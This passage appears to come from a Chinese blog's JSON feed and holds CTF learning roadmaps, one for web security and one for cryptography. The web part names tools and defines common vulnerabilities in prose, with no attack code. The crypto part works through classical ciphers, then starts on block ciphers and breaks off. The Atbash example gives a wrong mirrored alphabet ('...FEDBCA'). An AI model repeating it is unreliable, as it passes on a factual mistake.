部署项目</p>\n</blockquote>\n<blockquote>\n<p>docker-compose</p>\n</blockquote>\n<p><strong>参考资料</strong></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20v\">https://docs.docker.com/</span></p>\n<p>l B 站搜视频</p>\n<h1 id=\"0x02-web-安全基础\"><a class=\"anchor\" href=\"#0x02-web-安全基础\">#</a> 0x02 Web 安全基础</h1>\n<h2 id=\"21-常用工具\"><a class=\"anchor\" href=\"#21-常用工具\">#</a> 2.1 常用工具</h2>\n<h3 id=\"brup-suite\"><a class=\"anchor\" href=\"#brup-suite\">#</a> Brup Suite</h3>\n<blockquote>\n<p>Brup Suite 是一款基于 Java 开发的 Web 安全领域的跨平台工具，其集成了很多用于发现常见 Web 漏洞的模块，如 Proxy、Spider、Scanner、Intruder、Repeater 等。并且所有模块共享一个能处理并显示 HTTP 消息的扩展框架，模块间可以无缝交换信息。</p>\n</blockquote>\n<h3 id=\"sqlmap\"><a class=\"anchor\" href=\"#sqlmap\">#</a> Sqlmap</h3>\n<blockquote>\n<p>Sqlmap 是一款开源的渗透测试工具，可以自动检测并利用 SQL 注入漏洞。遇到一些需要进行绕过操作的，可以调用 Sqlmap 的一些 Tamper 或者自行编写 Tamper 来进行绕过。</p>\n</blockquote>\n<h3 id=\"nmap\"><a class=\"anchor\" href=\"#nmap\">#</a> Nmap</h3>\n<blockquote>\n<p>Nmap 可以快速扫描主机提供什么服务，这些服务运行什么操作系统，还可以探测这些主机用了什么类型的报文过滤器或防火墙，还有其他一些实用的功能。</p>\n</blockquote>\n<blockquote>\n<p>Nmap 扫描器还支持自定义扫描脚本，如 SQL 注入检测脚本、SMB 漏洞扫描脚本、FTP 爆破脚本。</p>\n</blockquote>\n<h3 id=\"chromefirefox\"><a class=\"anchor\" href=\"#chromefirefox\">#</a> Chrome/Firefox</h3>\n<blockquote>\n<p>Chrome/Firefox 虽然是浏览器，但是其庞大的插件库中，有很多插件是日常和 CTF 比赛中比较常用的。</p>\n</blockquote>\n<h4 id=\"浏览器插件\"><a class=\"anchor\" href=\"#浏览器插件\">#</a> 浏览器插件</h4>\n<blockquote>\n<p>开发者工具 (浏览器自带)</p>\n<p>是 Chrome/Firefox 自带的开发者工具，其集成了众多开发工具，可以对网页的元素、样式、脚本进行实时编辑、调试和监控。</p>\n</blockquote>\n<blockquote>\n<p>Proxy SwitchOmega</p>\n<p>一款可以在多个代理配置文件之间快速切换的插件。</p>\n</blockquote>\n<blockquote>\n<p>EditThisCookie</p>\n<p>EditThisCookie 是一个 Cookie 管理器，可以方便地添加、删除、修改、查询和锁定站点地 Cookies。</p>\n</blockquote>\n<blockquote>\n<p>Wappalyzer</p>\n<p>Wappalyzer 可以方便地查看当前站点地服务器型号、版本、服务器端语言等信息，不过有些题目会造假信息，干扰判断。</p>\n</blockquote>\n<h2 id=\"22-工具的使用\"><a class=\"anchor\" href=\"#22-工具的使用\">#</a> 2.2 工具的使用</h2>\n<p>工具只是方便我们渗透的流程，前期建议不过于依赖工具，尝试手动利用跟学习原理</p>\n<h2 id=\"23-漏洞原理\"><a class=\"anchor\" href=\"#23-漏洞原理\">#</a> 2.3 漏洞原理</h2>\n<blockquote>\n<p>熟悉基本漏洞类型的原理与利用，参考 OWASP top 10。</p>\n</blockquote>\n<p><strong>参考资料</strong></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5vd2FzcC5vcmcuY24vb3dhc3AtcHJvamVjdC8yMDE3LW93YXNwLXRvcC0xMA==\">http://www.owasp.org.cn/owasp-project/2017-owasp-top-10</span></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvd2ViL2ludHJvZHVjdGlvbi16aC8=\">https://ctf-wiki.github.io/ctf-wiki/web/introduction-zh/</span></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLndncHNlYy5vcmcva25vd2xlZGdlL3dlYi8=\">https://wiki.wgpsec.org/knowledge/web/</span></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly93aXphcmRmb3JjZWwuZ2l0Ym9va3MuaW8vd2ViLWhhY2tpbmctMTAxL2NvbnRlbnQv\">https://wizardforcel.gitbooks.io/web-hacking-101/content/</span></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYnVnYmFuay5jbi9saXZlL3hpYW9iYWk=\">https://www.bugbank.cn/live/xiaobai</span></p>\n<p>l 《白帽子讲 Web 安全》</p>\n<p>l 《精通脚本黑客》</p>\n<h2 id=\"24-常见web漏洞\"><a class=\"anchor\" href=\"#24-常见web漏洞\">#</a> 2.4 常见 web 漏洞</h2>\n<p>以下列举了常见的漏洞</p>\n<h3 id=\"sql注入\"><a class=\"anchor\" href=\"#sql注入\">#</a> SQL 注入</h3>\n<pre><code>通过在用户可控参数中注入 SQL 语法，破坏原有 SQL 结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以下两个原因叠加造成的：\n\n1. 程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造 SQL 语句\n2. 未对用户可控参数进行足够的过滤便将参数内容拼接进入到 SQL 语句中\n</code></pre>\n<h3 id=\"xss注入\"><a class=\"anchor\" href=\"#xss注入\">#</a> XSS 注入</h3>\n<pre><code>跨站脚本攻击（Cross Site Scripting），为不和层叠样式表（Cascading Style Sheets，CSS）的缩写混淆，故将跨站脚本攻击缩写为 XSS。恶意攻击者往 WEB 页面里插入恶意 HTML 代码，当用户浏览该页之时，嵌入其中 Web 里面的 HTML 代码会被执行，从而达到恶意攻击用户的特殊目的。\n</code></pre>\n<h3 id=\"rce命令执行\"><a class=\"anchor\" href=\"#rce命令执行\">#</a> RCE (命令执行)</h3>\n<pre><code>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如 PHP 中的 `system`、`exec`、`shell_exec` 等，当用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常命令中，造成命令执行攻击。这里还是主要以 PHP 为主介绍命令执行漏洞，Java 等应用的细节待补充。\n</code></pre>\n<h3 id=\"文件包含\"><a class=\"anchor\" href=\"#文件包含\">#</a> 文件包含</h3>\n<pre><code>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。\n</code></pre>\n<h3 id=\"csrf-跨站请求伪造\"><a class=\"anchor\" href=\"#csrf-跨站请求伪造\">#</a> CSRF 跨站请求伪造</h3>\n<pre><code>跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以 CSRF 攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF 可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时 CSRF 则可能威胁到整个 WEB 系统的安全。\n</code></pre>\n<h3 id=\"ssrf-服务器端请求伪造\"><a class=\"anchor\" href=\"#ssrf-服务器端请求伪造\">#</a> SSRF 服务器端请求伪造</h3>\n<pre><code>SSRF（Server-Side Request Forgery：服务器端请求伪造）是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。\n</code></pre>\n<h3 id=\"文件上传\"><a class=\"anchor\" href=\"#文件上传\">#</a> 文件上传</h3>\n<pre><code>在网站的运营过程中，不可避免地要对网站的某些页面或者内容进行更新，这时便需要使用到网站的文件上传的功能。如果不对被上传的文件进行限制或者限制被绕过，该功能便有可能会被利用于上传可执行文件、脚本到服务器上，进而进一步导致服务器沦陷。\n</code></pre>\n<h2 id=\"ctf\"><a class=\"anchor\" href=\"#ctf\">#</a> CTF</h2>\n<p>在 CTF 平台上刷题</p>\n<p>参加 CTF 比赛</p>\n<h3 id=\"ctf平台\"><a class=\"anchor\" href=\"#ctf平台\">#</a> CTF 平台</h3>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuLw==\">攻防世界</span></p>\n</blockquote>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYuYnVna3UuY29tLw==\">bugku</span></p>\n</blockquote>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi8=\">buuoj</span></p>\n</blockquote>\n<blockquote>\n<p>HACKTHEBOX</p>\n</blockquote>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYuYnVna3UuY29tLw==\">ctfhub</span></p>\n</blockquote>\n<h2 id=\"0x03-实战\"><a class=\"anchor\" href=\"#0x03-实战\">#</a> 0x03 实战</h2>\n<p>在这个阶段，需要有一定语言与漏洞基础，可以开始尝试深入研究一两个方向，最后再选择一个方向深入，选择前可以上网搜索以及与师兄师姐多做交流，了解好自己喜欢 / 擅长的方向</p>\n<h2 id=\"41-代码审计\"><a class=\"anchor\" href=\"#41-代码审计\">#</a> 4.1 <strong>代码审计</strong></h2>\n<p>常见审计语言有 PHP JAVA PYTHON（比如 java 有 Java 的命令执行、反序列化、JNDI 注入、框架漏洞等等），可以先尝试后选择一门喜欢的进行深入</p>\n<p>在网上找开源项目，跟着文章去动态调试，学习寻找漏洞的思路，完全熟练后可以尝试独立挖掘漏洞</p>\n<p><strong>参考资料</strong></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly9qYXZhc2VjLm9yZy8=\">https://javasec.org/</span></p>\n<h2 id=\"42-漏洞复现\"><a class=\"anchor\" href=\"#42-漏洞复现\">#</a> 4.2 漏洞复现</h2>\n<p>复现 Vulhub 上的漏洞复现最近爆出来的有详情的漏洞以及学会搭建靶场，复现 Nday 是一方面，学习思路才是更重要的，时常思考，这个漏洞他是怎么挖掘到的呢？如果在没有详情的情况下，只有官方通告，我要如果复现这个漏洞呢？有了前面的经验，可以开始复现最近爆出来的没有详情的漏洞，这个才是比较有价值的事情</p>\n<p><strong>参考资料</strong></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzLw==\">https://vulhub.org/#/environments/</span></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmJ5bGlicmFyeS5jbi8=\">https://wiki.bylibrary.cn/</span></p>\n<h2 id=\"45-渗透src-实战\"><a class=\"anchor\" href=\"#45-渗透src-实战\">#</a> 4.5 渗透 &amp; SRC 实战</h2>\n<p>参加补天众测，各大平台 SRC 项目，重点关注 SSRF XSS SQL 信息泄露 越权 逻辑漏洞。多练习信息收集（大有门路），关注最新披露漏洞及 poc。</p>\n<p>对已 Getshell 的站点，在获得授权之后，可以尝试进行内网渗透。这个程度需要自己把控，注意不要窥探过多信息，不要产生过多负面影响。内网经验绝对是加分项。</p>\n<h2 id=\"45-武器开发\"><a class=\"anchor\" href=\"#45-武器开发\">#</a> 4.5 武器开发</h2>\n<p>开发安全工具，可以根据上面几个方向选择自己要开发的武器类型，前期建议多做尝试</p>\n<p><strong>参考资料</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dlNXRlci9TY2FubmVycy1Cb3g=\">https://github.com/We5ter/Scanners-Box</span></p>\n",
            "tags": [
                "web"
            ]
        },
        {
            "id": "https://www.coldwinds.top/2021/12/crypto-start/",
            "url": "https://www.coldwinds.top/2021/12/crypto-start/",
            "title": "密码学（Crypto）学习方向",
            "date_published": "2021-12-13T01:58:52.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>我本身并不是学习密码学方向的，所以这里也只是收集整合了一些资料，简单介绍一下密码学方向的学习内容。</p>\n<p>纯粹密码学的考题，在 CTF 中会划分到 Crypto 中，有时也会被归于 MISC 的一种，有时会与 PWN、REVERSE 类型的题目相结合。且题目也趋向于前沿化、论文化。</p>\n<p>与其它方向相比，Crypto 对自身的数学功底要求很高，很大程度上密码学的难点都是数学问题，尤其是数论的内容一定要掌握。</p>\n<h1 id=\"0x00-安全素养\"><a class=\"anchor\" href=\"#0x00-安全素养\">#</a> 0x00 安全素养</h1>\n<h2 id=\"网络安全法\"><a class=\"anchor\" href=\"#网络安全法\">#</a> 网络安全法</h2>\n<p>不要违法，不要违法，不要违法。</p>\n<p><strong>参考资料</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjglQUQlRTUlOEQlOEUlRTQlQkElQkElRTYlQjAlOTElRTUlODUlQjElRTUlOTIlOEMlRTUlOUIlQkQlRTclQkQlOTElRTclQkIlOUMlRTUlQUUlODklRTUlODUlQTglRTYlQjMlOTU=\">https://baike.baidu.com/item/ 中华人民共和国网络安全法</span></p>\n<h1 id=\"0x01-基础\"><a class=\"anchor\" href=\"#0x01-基础\">#</a> 0x01 基础</h1>\n<h2 id=\"需要锻炼的能力\"><a class=\"anchor\" href=\"#需要锻炼的能力\">#</a> 需要锻炼的能力</h2>\n<ul>\n<li>\n<p><strong>数学能力</strong></p>\n<blockquote>\n<p>学好数学，学好数学，学好数学。</p>\n</blockquote>\n</li>\n<li>\n<p>识别能力</p>\n<blockquote>\n<p>能够识别出题目中使用的密码算法或编码算法。</p>\n</blockquote>\n</li>\n<li>\n<p>攻击能力</p>\n<blockquote>\n<p>能够结合题目环境设置联想到针对特定算法的攻击方法。</p>\n</blockquote>\n</li>\n<li>\n<p>分析能力</p>\n<blockquote>\n<p>能够针对位置算法进行人工分析。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>编程能力</strong></p>\n<blockquote>\n<p>能够编程实现破解该算法的程序，并对自己编写的程序的算法复杂度与运行时间有着清醒的认识。</p>\n<p><strong>了解 Python 编程，会写脚本</strong></p>\n</blockquote>\n</li>\n<li>\n<p>学习能力</p>\n<blockquote>\n<p>能够快速理解最新文献中的密码学攻击方法并加以实现。</p>\n</blockquote>\n</li>\n<li>\n<p>跨领域能力</p>\n<blockquote>\n<p>能够掌握 Reverse、PWN、Web 等其他领域的基础知识。（有时 Crypto 会与其他领域结合）</p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"密码学攻击\"><a class=\"anchor\" href=\"#密码学攻击\">#</a> 密码学攻击</h2>\n<ul>\n<li>\n<p>唯密文攻击</p>\n<blockquote>\n<p>攻击者只拥有密文。</p>\n</blockquote>\n</li>\n<li>\n<p>已知明文攻击</p>\n<blockquote>\n<p>攻击者拥有一些与密文对应的明文。</p>\n</blockquote>\n</li>\n<li>\n<p>选择明文攻击</p>\n<blockquote>\n<p>攻击者可以进行加密，能够获取指定明文加密后的密文。</p>\n</blockquote>\n</li>\n<li>\n<p>选择密文攻击</p>\n<blockquote>\n<p>攻击者可以进行解密，能够获取指定密文解密后的明文。</p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"相关书籍推荐\"><a class=\"anchor\" href=\"#相关书籍推荐\">#</a> 相关书籍推荐</h2>\n<ul>\n<li><strong>《数论盖伦》</strong></li>\n<li><strong>《深入浅出密码学》</strong></li>\n<li><strong>《图解密码学》</strong></li>\n<li><strong>《An Introduction to Mathematical Cryptography》</strong></li>\n</ul>\n<h2 id=\"ctf平台\"><a class=\"anchor\" href=\"#ctf平台\">#</a> CTF 平台</h2>\n<p><strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi8=\">buuoj</span></strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuLw==\">攻防世界</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYuYnVna3UuY29tLw==\">bugku</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYuYnVna3UuY29tLw==\">ctfhub</span></p>\n<h2 id=\"学习路线推荐\"><a class=\"anchor\" href=\"#学习路线推荐\">#</a> 学习路线推荐</h2>\n<blockquote>\n<p>这里会给出一份学习路线推荐提供参考，实际按照个人情况自由发挥。</p>\n</blockquote>\n<p>作为新手接触密码学，首先从古典密码开始学起，同时还要接触各种新出的、热门的、经典的编码。在 CTF 平台上大量刷题，同时撰写 wp，一些比较生疏的置换密码表要多看几遍，不一定要全记住但需要有个印象。</p>\n<p>在古典密码了解比较透彻后，可以开始接触现代密码，首先推荐学习与古典密码关系较大且对数学要求不是很高的的分组密码，把分组密码的五种工作模式以及对应的攻击手段搞清楚。最好是能够自己通过 C/Python 编写程序复现 AES/DES 的加解密过程。</p>\n<p>到公钥密码这一块，就对数论基础有较高的要求了，当数论理解了之后，公钥密码也很容易搞懂。这里主要讲以下关于数学的学习，数学是一个长期的过程，不用想着一个月就要搞懂一门，对于计算机学院的同学来说，学院会开设线性代数、离散数学、高等数学等数学课程，如果感觉课上没搞懂，可以看网课继续学习。对数论有了一定基础后，就可以去看一些专门介绍某种加密算法和攻击的论文或者书籍。</p>\n<p>如果想在数论方面进一步精进，下面给出一些相关的重点学习内容：</p>\n<blockquote>\n<ol>\n<li>初等数论：整除、同余、二次剩余、原根，并了解有限域上的椭圆曲线。</li>\n<li>线性代数：学校教的内容，以及<strong>向量空间、子空间、线性变换 / 线性映射的概念</strong>。更进阶的话题：对偶空间。</li>\n<li>抽代群论部分：重点关注<strong>有限群</strong>。群、子群、置换群、循环群、陪集与拉格朗日定理（可学群的作用加强理解）、正规子群与商群。<strong>同态、同构</strong>是代数的重要工具。</li>\n<li>抽代环论部分：重点关注<strong>含幺元的有限交换环和欧式环</strong>。环、子环、<strong>理想</strong>与商环、多项式环。</li>\n<li>抽代域论部分：重点关注 ** 有限域。** 至少能理解有限域上有四则运算。有余力可学域的有限扩张、<strong>本原元</strong>、~~ 分式域。</li>\n</ol>\n</blockquote>\n<h1 id=\"0x02-密码学\"><a class=\"anchor\" href=\"#0x02-密码学\">#</a> 0x02 密码学</h1>\n<h2 id=\"编码\"><a class=\"anchor\" href=\"#编码\">#</a> 编码</h2>\n<p>编码（encode）的目的不是为了让别人看到后解不出来，而是代表信息的另外一种表达方式。将原始信息转化为编码信息后进行传输，可以解决一些特殊字符、不可见字符的传输问题。接收者接受到编码信息后将其转化为原始信息的过程称为解码（decode）。</p>\n<p>编码的用处不仅仅是单独出题，很多时候也为作为题目的一部分，因此掌握编码的识别和转化技巧是学习密码学的基础。</p>\n<p>下面是一些 CTF 比赛中常见的编码：</p>\n<ul>\n<li>\n<p>Hex</p>\n<blockquote>\n<p>Hex 是最常用的编码方式之一，它会将信息转化为十六进制。</p>\n<p>在进行其他的编码转化时，有时也会先把信息用 Hex 编码再转化。</p>\n<p>Hex 因为比较简单，本身并不会单独出考点，更多时候是用于数据处理。</p>\n</blockquote>\n</li>\n<li>\n<p>Urlencode</p>\n<blockquote>\n<p>Urlencode 可用于浏览器与网站之间的数据交换，主要是为了解决一些特殊字符的传输过程中产生的问题。</p>\n<p>该编码十分容易理解，即特殊字符在 Hex 编码的基础上，每个字符前置一个 % 即可。</p>\n</blockquote>\n</li>\n<li>\n<p>Morsecode</p>\n<blockquote>\n<p>摩斯电码应该是最耳熟能详的编码方式，其由长短音构成，在得到一串经过摩斯电码编码的信息后，可以对照密码表得到原始信息。</p>\n<p>摩斯电码通常与 Misc 的音频题结合。</p>\n</blockquote>\n</li>\n<li>\n<p>jsfuck</p>\n<blockquote>\n<p>jsfuck 的特征十分明显，只要有 <code>()+[]!</code>  这六个字符组成的的字符串，基本可以确定是 jsfuck 编码。</p>\n</blockquote>\n</li>\n<li>\n<p>uuencode</p>\n<blockquote>\n<p>uuencode 是把二进制文件转化为可见字符文本的编码。</p>\n<p>经过 uuencode 编码的代码杂乱无章，但是其 ASCII 取值为 32 到 95，因此并不会出现小写字母，所以 uuencode 也比较好辨认。</p>\n</blockquote>\n</li>\n<li>\n<p>base</p>\n<blockquote>\n<p>base 系列的编码包括 base64、base32、base16 等，其中 base64 最常出现。</p>\n<p>以 base64 为例，其将输入中的每 3 字节（24 比特）按每 6 比特分成一组，编程 4 个小于 64 的索引值，然后通过一个索引表得到 4 个可见字符。</p>\n<p>如果改变了这个索引表中的内容，所得到的编码称为私有 base64，解码方法也是将索引表换成被修改后的私有表，然后解码。也可以用正常索引表解码后当作代替密码解密。</p>\n</blockquote>\n<blockquote>\n<p>一般情况下，最后有 <code>=</code>  的编码就是 base 编码，当然 base 编码的最后也可以不含 <code>=</code> 。</p>\n<p>区别 base64、base32、base16 的方式是观察编码中的字符是否位于对应的字符集上。</p>\n<p>base64： <code>a-z，A-Z，0-9，+，/以及补位的=</code></p>\n<p>base32： <code>A-Z，2-7以及补位的=</code></p>\n<p>base16： <code>A-F，0-9以及补位的=</code></p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"密码\"><a class=\"anchor\" href=\"#密码\">#</a> 密码</h2>\n<p>密码与编码最大的区别就在于密码多了一个关键信息：密钥。</p>\n<p>在密码学的学习中，一般用 ** <code>k</code> <strong> 代表密钥，用</strong> <code>m</code> <strong> 代表明文，用</strong> <code>c</code> ** 代表密文。</p>\n<h3 id=\"古典密码\"><a class=\"anchor\" href=\"#古典密码\">#</a> 古典密码</h3>\n<p>古典密码是最简单的密码加密类型，其对数论的要求并不是很高。在形式上可以分成移位密码和代替密码两类。</p>\n<p>古典密码现在已经不再单独作为加密算法使用，但它们是很多现代密码算法的基石。</p>\n<h4 id=\"移位密码\"><a class=\"anchor\" href=\"#移位密码\">#</a> 移位密码</h4>\n<p>移位密码是密码学中最基础的一种密码形式，将明文根据密钥进行位置的变换得到的密文就是移位密码。</p>\n<ul>\n<li>\n<p>简单移位密码</p>\n<blockquote>\n<p>当明文为 m，密钥为 k 时，移位密码会按照 k 的长度来切分 m，然后按照密钥 k 的顺序对每一部分都进行密钥变化，再把加密后的每一部分重新组合，得到密文。</p>\n</blockquote>\n<blockquote>\n<p>m=&quot;nowyouknowcrypto&quot;</p>\n<p>k=&quot;3124&quot;</p>\n<p>先将 m 按照 k 的长度拆分：nowy、oukn、owcr、ypto。</p>\n<p>按照 k 的顺序进行变换，即将原来的第 1 位放到第 3 位，第 2 位放到第 1 位，第 3 位放到第 2 位，第 4 位放到第 4 位，得到：owny、ukon、wcor、ptyo。</p>\n<p>最后组合每一部分，得到密文：ownyukonwcorptyo。</p>\n</blockquote>\n</li>\n<li>\n<p>曲路密码</p>\n<blockquote>\n<p>曲路密码先将明文填入一个表中，然后按照一定曲路遍历。</p>\n<p>之前画的图找不到了，用 wiki 的图代替一下。</p>\n</blockquote>\n<blockquote>\n<p>m=&quot;The quick brown fox jumps over the lazy dog&quot;</p>\n<p>c=&quot;gesfc inpho dtmwu qoury zejre hbxva lookT&quot;</p>\n</blockquote>\n<p><img data-src=\"https://ctf-wiki.org/crypto/classical/figure/qulu-table.png\" alt=\"\" title=\"填入 5 行 7 列表（事先约定填充的行列数）\" /></p>\n</li>\n</ul>\n<p><img data-src=\"https://ctf-wiki.org/crypto/classical/figure/qulu-road.png\" alt=\"曲路密码\" title=\"加密的回路线（事先约定填充的行列数）\" /></p>\n<ul>\n<li>\n<p>云影密码</p>\n<blockquote>\n<p>云影密码仅包含 <code>01248</code>  五个数字，其中 <code>0</code>  用于分割，其余数字做加和操作后转换为明文。</p>\n</blockquote>\n<blockquote>\n<p>k=&quot;abcdefghijklmnopqrstuvwxyz&quot;</p>\n<p>m=&quot;120844208481220448041184201428&quot;</p>\n<p>按照 <code>0</code>  划分为 <code>12</code> 、 <code>8442</code> 、 <code>848122</code> 、 <code>448</code> 、 <code>411842</code> 、 <code>1428</code> 。</p>\n<p>解密：1+2=3=c、8+4+4+2=18=r、8+4+8+1+2+2=25=y、4+4+8=16=p、4+1+1+8+4+2=20=t、1+4+2+8=15=o。</p>\n<p>c=&quot;crypto&quot;</p>\n</blockquote>\n</li>\n<li>\n<p>栅栏密码</p>\n<blockquote>\n<p>栅栏密码是一种规则特殊的移位密码，密钥 <code>k</code>  只有一个数字，表示栅栏的长度。</p>\n<p>在加密时把要加密的明文 m 分为 <code>k</code>  个一组，然后每组的第一个字符依次连接，然后每组的第二个字符依次连接…… 拼接而成的字符串就是密文 c。</p>\n</blockquote>\n<blockquote>\n<p>m=&quot;nowyouknowcrypto&quot;</p>\n<p>k=4</p>\n<p>把 m 分为 k 个一组：nowy、oukn、owcr、ypto。</p>\n<p>每组第一、二、三、四个字符连接：nooy、ouwp、wkct、ynro。</p>\n<p>拼接在一起得到密文。</p>\n<p>c=&quot;nooyouwpwkctynro&quot;</p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"替代密码\"><a class=\"anchor\" href=\"#替代密码\">#</a> 替代密码</h4>\n<p>替代密码首先会建立一个替换表，加密是将需要加密的明文依次通过查表替换为相应的字符，明文字符被逐个替换后会变成无意义的字符串，即密文。替代密码的密钥就是替换表。</p>\n<p>如果替换表只有一个，称为单表替代密码；如果替换表有多个，加密过程中依次使用，则称为多表替代密码。</p>\n<p>针对替代密码最有效的攻击方式是词频分析。</p>\n<h5 id=\"单表替代密码\"><a class=\"anchor\" href=\"#单表替代密码\">#</a> 单表替代密码</h5>\n<ul>\n<li>\n<p>凯撒密码</p>\n<blockquote>\n<p>凯撒密码通过将字母移动一定的位数来实现加密解密，即明文中所有字母都在字母表上向后（或向前）按照一个固定的数目进行偏移后被替换成密文。</p>\n</blockquote>\n<blockquote>\n<p>当偏移值为 3 时，明文中所有字母 A 被替换成 D、B 替换成 E、C 替换成 F，以此类推，然后 W 替换成 Z、X 替换成 A、Y 替换成 B、Z 替换成 C。</p>\n</blockquote>\n<blockquote>\n<p>k=4</p>\n<p>m=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</p>\n<p>C=&quot;EFGHIJKLMNOPQRSTUVWXYZABCD&quot;</p>\n</blockquote>\n</li>\n<li>\n<p>ROT13</p>\n<blockquote>\n<p>ROT13 本质上是一种特殊的凯撒密码，当 k=13，且只作用于 <code>A-Z、a-z</code>  时，称之为 ROT13。</p>\n</blockquote>\n</li>\n<li>\n<p>埃特巴什码</p>\n<blockquote>\n<p>埃特巴什码与凯撒密码类似，但它的替换表时通过对称获得的。</p>\n</blockquote>\n<blockquote>\n<p>ABCDEFGHIJKLMNOPQRSTUVWXYZ 通过镜像对称得到 ZYXWVUTSRQPONMLKJIHGFEDBCA。</p>\n<p>然后用对称后的字母表替换掉原来字符串中的字母，得到密文。</p>\n</blockquote>\n</li>\n<li>\n<p>培根密码</p>\n<blockquote>\n<p>培根密码一般用两种不同的字体表示密文，使用 AB 代表两种字体，5 个一组，表示密文。</p>\n</blockquote>\n</li>\n<li>\n<p>图形替代密码</p>\n<blockquote>\n<p>即将明文用图形进行代替来实现加密。</p>\n<p>比较经典的有：猪圈密码、跳舞的小人……</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"多表替代密码\"><a class=\"anchor\" href=\"#多表替代密码\">#</a> 多表替代密码</h5>\n<p>多表替代密码的举例过于繁琐，这里只简单讲解一下各个多表替代密码的原理</p>\n<ul>\n<li>\n<p>棋盘类密码</p>\n<blockquote>\n<p>常见的棋盘类密码有：Playfair、Polybius、Nihilist。这类密码的密钥是一个 5x5 的棋盘。</p>\n<p>棋盘的生成有以下条件：</p>\n<ol>\n<li>顺序随机</li>\n<li>不能出现重复字母</li>\n<li><code>i</code>  和 <code>j</code>  视为同一个字（也有去除 q 的，总之要保证总数为 25 个）</li>\n</ol>\n<p>在生成棋盘后，不同的加密方式会用不同的转换方式，这里就不继续深入了。</p>\n</blockquote>\n</li>\n<li>\n<p>维吉尼亚密码</p>\n<blockquote>\n<p>维吉尼亚密码是使用一系列凯撒密码组成密码字母表的加密算法，是标准的多表替代密码。</p>\n<p>假设密钥为 CTF，会根据 <code>C、T、F</code>  三个字母在 <code>A-Z</code>  中的偏移得到三个凯撒密码的替换表。然后在进行加密，明文的第一个位置会根据 <code>C</code>  生成的替换表移位加密，第二个位置会根据 <code>T</code>  生成的替换表移位加密，第三个位置会根据 <code>F</code>  生成的替换表移位加密，第四个位置又回到使用 <code>C</code>  生成的替换表移位加密，以此类推。</p>\n</blockquote>\n</li>\n<li>\n<p>希尔密码</p>\n<blockquote>\n<p>希尔密码是运用基本矩阵论原理的替换密码。</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"现代密码\"><a class=\"anchor\" href=\"#现代密码\">#</a> 现代密码</h3>\n<h4 id=\"分组密码\"><a class=\"anchor\" href=\"#分组密码\">#</a> 分组密码</h4>\n<p>分组密码是将铭文信息编码表示后的 bit 序列，按照固定长度进行分组，在同一密钥控制下用同意算法逐组进行加密，从而将各个明文分组变换成一个长度固定的密文分组密码。简单来说，古典密码中的替代密码是对一个字符进行替换，分组密码则是对一个分组进行替换。</p>\n<ul>\n<li>\n<p>DES/AES</p>\n<blockquote>\n<p>DES/AES 属于迭代型分组密码，涉及参数包括分组长度、密钥长度、迭代次数（圈数）、圈密钥长度。</p>\n<p>DES 的分组长度为 64bit，密钥长度为 64bit，圈数为 16，圈密钥长度为 48bit。</p>\n<p>AES 的分组长度为 128bit。当密钥长度为 128bit 时，圈数为 10；当密钥长度为 192bit 时，圈数为 12；当密钥长度为 256bit 时，圈数为 14.</p>\n</blockquote>\n<blockquote>\n<p>在 DES 和 AES 中，有两种加解密模式 ECB 和 CBC。其中 CBC 模式的加密会比 ECB 模式多一个初始向量 IV。</p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"序列密码\"><a class=\"anchor\" href=\"#序列密码\">#</a> 